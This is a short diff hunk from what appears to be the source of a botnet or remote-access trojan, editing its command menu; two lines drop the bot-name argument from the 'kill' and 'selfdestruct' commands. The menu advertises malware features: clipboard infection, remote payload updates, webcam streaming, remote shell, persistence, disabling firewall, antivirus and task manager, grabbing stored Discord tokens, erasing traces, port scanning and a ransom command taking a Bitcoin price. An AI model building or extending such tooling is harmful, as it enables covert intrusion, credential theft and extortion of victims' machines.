@@ -9,14 +9,14 @@
           ║     stopinfectclipboard <botName>              ║     Admin privileges required                 ║  
           ║     updatepayload <botName> <url>              ║     Admin privileges required                 ║
           ║     webcam <botName> <ip> <port>               ║     Stream webcam footage                     ║
-          ║     kill <botName>                             ║     Stop client from listening                ║
+          ║     kill                                       ║     Stop client from listening                ║
           ║     shell <botName> <cmd>                      ║     Run shell commands                        ║
           ║     persistence <botName>                      ║     Set persistence                           ║
           ║     disablefirewall <botName>                  ║     Disable firewall                          ║
           ║     disableantivirus <botName>                 ║     Disable antivirus                         ║
           ║     disabletaskmanager <botName>               ║     Disable taskmanager                       ║
           ║     tokens <botName>                           ║     Grab all stored discord tokens            ║
-          ║     selfdestruct <botName>                     ║     Remove all traces of the BotNet           ║
+          ║     selfdestruct                               ║     Remove all traces of the BotNet           ║
           ║     pscan <botName> <ip> <ps> <pe> <thread>    ║     pscan bot 127.0.0.1 1 100 100             ║
           ║     ransom <botName> <price> <email> <btc>     ║     ransom $100 mail@mail.com BTC             ║
           ╚════════════════════════════════════════════════════════════════════════════════════════════════╝
